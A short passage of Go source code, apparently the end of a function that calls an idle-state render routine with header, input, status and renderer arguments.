		sl.RenderIdle(header, input, status, false, renderers, false, "")
	}
}
